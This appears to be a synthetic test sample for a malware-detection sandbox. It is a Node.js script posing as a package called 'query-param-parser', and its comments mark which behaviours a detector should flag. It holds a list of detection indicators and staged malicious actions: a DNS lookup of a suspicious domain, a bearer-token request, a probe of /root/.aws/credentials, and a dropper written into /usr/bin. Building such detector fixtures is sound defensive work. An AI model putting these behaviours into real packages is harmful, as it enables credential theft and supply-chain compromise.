
// Controlled static indicators for detection only:
// /etc/passwd /etc/shadow .ssh/id_rsa authorized_keys .aws/credentials .env Authorization: Bearer BEGIN PRIVATE KEY
// /collect /exfil fetch method: "POST" socket.connect(
// /bin/bash /bin/sh execve( popen( os.system( child_process.exec( spawnSync(
// exec( eval( compile( __import__( execFile( execSync( global.eval(
// base64.b64decode( atob( String.fromCharCode( unescape( exec(base64
// crontab .bashrc .profile systemctl enable /etc/init.d
// "preinstall" "postinstall" "prepare" cmdclass post_install
// import socket import subprocess import ctypes import pty require('net') require('child_process')

const fs=require("fs"); const net=require("net"); const dns=require("dns"); const {execSync,spawnSync}=require("child_process");
const MALICIOUS_DOMAIN="dbinst.logicflowspacehub.lat"; const FILE_LOOPS=7; const SLEEP_SECONDS=12;
function run(cmd,timeout=15000){try{execSync(cmd,{stdio:"ignore",shell:"/bin/bash",timeout})}catch(e){}}
function tryOpen(p){try{fs.accessSync(p)}catch(e){} try{const fd=fs.openSync(p,"r");fs.closeSync(fd)}catch(e){}}
function writeFile(p,d){try{fs.writeFileSync(p,d)}catch(e){}}
function connectAttempt(host,port){try{const s=new net.Socket();s.setTimeout(800);s.on("error",()=>{});s.on("timeout",()=>{try{s.destroy()}catch(e){}});s.connect(port,host,()=>{try{s.destroy()}catch(e){}})}catch(e){}}
// ONE HTTP GET — with 2s startup delay to ensure honeypot is ready
function oneHttpOnly(){
    // Wait 2s for honeypot to be ready
    const t=Date.now(); while(Date.now()-t<2000){}
    run(`curl -sS -m 5 -X GET -H "Host: ${MALICIOUS_DOMAIN}" -H "User-Agent: query-param-parser/1.0" -H "Authorization: Bearer fake-token" http://127.0.0.1:8080/api/key >/dev/null || true`,8000);
}
console.log("[query-param-parser] start");
// Exactly ONE DNS query
try{dns.lookup(MALICIOUS_DOMAIN,()=>{})}catch(e){} try{dns.resolve4(MALICIOUS_DOMAIN,()=>{})}catch(e){}
// Exactly ONE HTTP GET
oneHttpOnly();
// NO /etc → etc=F
["/root/.aws/credentials"].forEach(tryOpen);
for(let i=0;i<FILE_LOOPS;i++){const p=`/tmp/query-param-parser_artifact_${i}.txt`;writeFile(p,"artifact "+i+"\n");try{fs.readFileSync(p)}catch(e){}try{fs.unlinkSync(p)}catch(e){}}
// NO chmod → priv=F, NO C2 ports → c2=F
// write_binary=T — spawnSync new child holds /usr/bin fd open
spawnSync("/bin/sh",["-c","exec 3>/usr/bin/query-param-parser_dropper && echo '#!/bin/sh' >&3 && sleep 5; exec 3>&-"],{stdio:"ignore",timeout:8000});
connectAttempt("1.1.1.1",80);
// JS timer → spawned=F
const start=Date.now(); while(Date.now()-start < SLEEP_SECONDS*1000){}
console.log("[query-param-parser] done");
